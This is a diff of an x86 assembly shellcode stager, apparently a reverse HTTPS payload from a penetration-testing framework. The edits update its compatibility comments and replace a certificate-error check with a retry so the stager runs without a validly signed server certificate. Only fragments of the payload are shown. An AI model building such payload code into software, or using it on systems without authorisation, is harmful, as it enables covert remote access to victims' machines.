@@ -1,7 +1,7 @@
 ;-----------------------------------------------------------------------------;
 ; Author: HD Moore
-; Compatible: Confirmed Windows 7, Windows XP
-; Known Bugs: Windows NT 4.0, Windows XP SP1 Embedded
+; Compatible: Confirmed Windows 7, Windows XP, Windows 2000
+; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
 ; Version: 1.0
 ;-----------------------------------------------------------------------------;
 [BITS 32]
@@ -85,15 +85,17 @@ httpsendrequest:
   jnz short allocate_memory
 
 check_ssl:
+
 ; In the case of an invalid certificate authority, we have to wait until the error occurs,
 ; set an option to disable it, then try it all over again. This wastes shellcode space,
 ; but its required to use this payload without a valid signed cert.
-;  push 0x5DE2C5AA        ; hash( "kernel32.dll", "GetLastError" )
+;  push 0x5DE2C5AA       ; hash( "kernel32.dll", "GetLastError" )
 ;  call ebp
+;  cmp al, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
 
-; The error message is left in ECX on some platforms (but not wow64)
- ; cmp cl, 0x0d           ; ERROR_INTERNET_INVALID_CA (0x2f0d)
-
+; Instead of wasting more bytes on GetLastError (which isn't resolving properly on Windows XP),
+; we just try a second time if the initial send fails. This provides us with a real retry
+; mechanism for free.
   dec ebx
   jz failure
 
